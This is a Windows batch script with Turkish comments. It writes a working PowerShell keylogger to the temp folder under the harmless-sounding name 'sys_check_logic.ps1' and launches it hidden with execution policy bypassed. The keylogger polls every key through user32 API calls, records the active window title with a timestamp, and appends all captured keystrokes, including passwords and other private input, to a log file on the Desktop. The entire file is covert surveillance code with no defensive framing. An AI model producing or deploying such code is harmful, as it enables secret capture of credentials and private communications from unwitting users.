@echo off
setlocal enabledelayedexpansion
set "psScript=%temp%\sys_check_logic.ps1"
set "logFile=%USERPROFILE%\Desktop\test_log.txt"

:: PowerShell betiğini oluştur (optimized)
(
  echo $signature = @'
  echo [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
  echo [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
  echo [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
  echo [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
  echo [DllImport("user32.dll")] public static extern bool GetKeyboardState(byte[] lpKeyState);
  echo [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
  echo '@
  echo $api = Add-Type -MemberDefinition $signature -Name 'Win32' -Namespace 'API' -PassThru
  echo $lastTitle = ''
  echo $keyState = New-Object byte[] 256
  echo $sb = New-Object System.Text.StringBuilder 5
  echo $output = ''
  echo.
  echo while($true^) {
  echo     $hWnd = $api::GetForegroundWindow(^)
  echo     $titleBuilder = New-Object System.Text.StringBuilder 256
  echo     if ($api::GetWindowText($hWnd, $titleBuilder, 256^) -gt 0^) {
  echo         $currentTitle = $titleBuilder.ToString(^)
  echo         if ($currentTitle -ne $lastTitle^) {
  echo             if ($output^) { $output ^| Out-File -Path '%logFile%' -Append -Encoding UTF8; $output = '' }
  echo             $lastTitle = $currentTitle
  echo             $output += "`n`n[Pencere: $currentTitle] - $(Get-Date -Format 'HH:mm:ss')`n"
  echo         }
  echo     }
  echo     for($i=1; $i -le 255; $i++^) {
  echo         if($api::GetAsyncKeyState($i^) -eq -32767^) {
  echo             $out = ''
  echo             if ($i -eq 13^) { $out = ' [ENTER] ' }
  echo             elseif ($i -eq 8^) { $out = ' [BckSpc] ' }
  echo             elseif ($i -eq 9^) { $out = ' [TAB] ' }
  echo             else {
  echo                 $api::GetKeyboardState($keyState^) ^| Out-Null
  echo                 $sb.Clear(^) ^| Out-Null
  echo                 $scanCode = $api::MapVirtualKey($i, 0^)
  echo                 $result = $api::ToUnicode($i, $scanCode, $keyState, $sb, $sb.Capacity, 0^)
  echo                 if ($result -gt 0^) { $out = $sb.ToString(^) }
  echo             }
  echo             if ($out^) { $output += $out }
  echo         }
  echo     }
  echo     if ($output.Length -gt 500^) { $output ^| Out-File -Path '%logFile%' -Append -Encoding UTF8; $output = '' }
  echo     Start-Sleep -Milliseconds 15
  echo }
) > "%psScript%"

:: Gizli başlat
start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%psScript%"
echo Loglama basladi. @, #, ?, gibi tum karakterler artik destekleniyor.
pause